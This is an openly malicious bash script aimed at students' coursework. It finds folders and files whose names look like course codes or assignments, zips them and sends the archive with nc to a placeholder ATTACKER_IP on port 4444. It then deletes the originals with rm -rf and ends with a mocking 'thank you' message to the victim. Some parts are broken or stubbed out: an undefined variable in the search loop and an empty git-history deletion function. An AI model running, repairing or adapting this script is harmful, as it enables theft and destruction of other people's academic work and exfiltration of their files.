#!/bin/bash

# This version will remove all assignment directories and files
# from the original user. The setup also intended to try git history
# deletion. But upon testing with my CSE gitlab 

temp_dirs=$(mktemp ./tempfile.XXXXXX)
temp_file=$(mktemp ./tempfile.XXXXXX)
ATTACKER_IP="ATTACKER IP HERE"

excluded=("Library" "Applications" "Pictures" "Movies" "Music")
is_excluded() {
    local name="$1"
    for ex in "${excluded[@]}"; do
        if [[ "$name" == "$ex" ]]; then
            return 0  # name is excluded
        fi
    done
    return 1  # name is not excluded
}

recurse_files() {
    local path=$1

    if [[ $(basename "$path") =~ ([Cc][Oo][Mm][Pp][ _.-]?[0-9]{4})|^(.*[ _.-])?([Aa][Ss]{2})(([Ii][Gg][Nn][Mm][Ee][Nn][Tt])|[Tt])?([ _.0-9-].*)?$ ]]; then
        [ -d "$path" ] && echo "$path" >> "$temp_dirs"
        [ -f "$path" ] && echo "$path" >> "$temp_file"
    elif [ -d "$path" ]; then 
        for item in "$path"/*; do
            recurse_files "$item"
        done
    fi
}

delete_git() {
    local path=$1
}

# initiate search
for dir in *; do
    if ! is_excluded $(basename "$dir"); then
        recurse_files "$base"
    fi
done

# zip files
zip_file="matching_files.zip"
if [ -s "$temp_file" ]; then
    zip -r "$zip_file" $(< "$temp_file") -x "*/.*" > /dev/null
fi

# send zip
if [ -f "$zip_file" ]; then
    cat "$zip_file" | nc "$ATTACKER_IP" 4444
fi

# delete git histories on directories that have .git
for dir in $(cat "$temp_dirs"); do
    delete_git "$dir"
done

# delete everything on target's machine
for path in $(cat "$temp_file"); do
    rm "$path"
done

for path in $(cat "$temp_dirs"); do
    rm -rf "$path"
done

rm "$temp_file" "$zip_file" 2>/dev/null

# thank the target for saving our time :)
echo "Thank you for your hard work!! ^_^ much appreciateddd <3"
